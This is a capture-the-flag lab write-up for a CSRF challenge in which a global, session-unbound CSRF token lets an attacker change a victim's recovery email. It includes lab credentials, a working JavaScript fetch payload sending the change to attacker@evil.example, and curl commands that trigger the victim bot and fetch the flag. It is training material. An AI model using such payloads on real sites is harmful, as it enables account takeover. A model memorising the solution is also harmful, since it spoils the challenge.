# CSRF — NoSessionBinding · Corpx Hub (difficulty: medium)

`POST /account/recovery-email` changes the logged-in user's recovery email and genuinely requires + validates a CSRF token (SEC-08). The flaw: the token is **one global static secret** — generated at boot, identical for everyone, and rendered on every user's `/account` page. A CSRF token that is not bound to the victim's session protects nothing: log in with your *own* account, read the same token from your own settings page, then submit it in a cross-site request that rides the victim's cookie.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`; open http://victim.target.lab:8119/account and copy the `csrf_token` value from the hidden form field (view source).
2. Store the artifact on the exploit server, embedding that token: `<script>fetch('http://victim.target.lab:8119/account/recovery-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"recovery_email":"attacker@evil.example","csrf_token":"<paste token>"}'})</script>`
3. Trigger the victim bot with the same token (it rides the innocent's session): `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/account/recovery-email","method":"POST","body":{"recovery_email":"attacker@evil.example","csrf_token":"<paste token>"}}'`
4. `curl http://collector.target.lab:8119/verify` → flag (innocent's `recovery_email` row changed). Note: sending no token or a garbage token returns 403 — the check exists, the *binding* does not.

Flag: `DSLTV{CSRF-NoSessionBinding-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
